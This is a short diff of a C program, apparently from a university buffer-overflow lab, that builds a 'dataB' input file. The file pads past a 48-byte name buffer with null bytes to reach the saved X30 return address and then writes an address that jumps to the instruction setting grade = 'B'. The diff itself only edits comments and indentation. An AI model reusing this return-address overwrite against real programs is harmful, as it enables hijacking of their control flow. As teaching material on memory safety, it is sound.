@@ -5,6 +5,8 @@
 
 #include <stdio.h>
 #include <string.h>
+
+/* Size of name array */
 enum {BUFSIZE = 48};
 
 /*--------------------------------------------------------------------*/
@@ -30,13 +32,13 @@ int main(void)
    }
    
    /* Writes enough null bytes to the dataB file
-   to overrun until X30 */
+      to overrun until X30 */
    for (i = 0; i < (BUFSIZE-(strlen(psName))); i++) {
       fprintf(psFile, "%c", 0x00);
    }
 
    /* Writes the address which corresponds to 
-   instruction: grade = 'B' */
+      instruction: grade = 'B' */
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
 
    fclose(psFile);
